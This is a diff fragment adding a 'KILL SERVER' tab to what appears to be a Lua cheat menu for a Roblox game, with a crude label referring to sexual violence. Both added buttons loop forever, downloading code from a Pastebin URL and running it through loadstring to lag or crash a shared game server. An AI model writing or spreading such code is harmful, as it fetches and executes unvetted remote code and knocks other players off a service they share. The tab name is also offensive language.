@@ -783,3 +783,28 @@ AddButton(Main, {
       end 
   end 
 })
+
+local Main = MakeTab({Name = "OP THINGS"})
+local sectionServrr = AddSection(Main, {"RAPE SERVER"})
+
+AddButton(Main, { 
+  Name = "KILL SERVER ( NORMAL LAG )", 
+  Description = "DONT SPAM!", 
+  Callback = function()
+      while true do
+loadstring(game:HttpGet("https://pastebin.com/raw/kJDeXFbf"))()
+        wait(1)
+      end
+    end
+  })
+
+AddButton(Main, { 
+  Name = "KILL SERVER ( SUPER LAG )", 
+  Description = "DONT SPAM!", 
+  Callback = function()
+      while true do
+loadstring(game:HttpGet("https://pastebin.com/raw/kJDeXFbf"))()
+        wait()
+      end
+    end
+  })
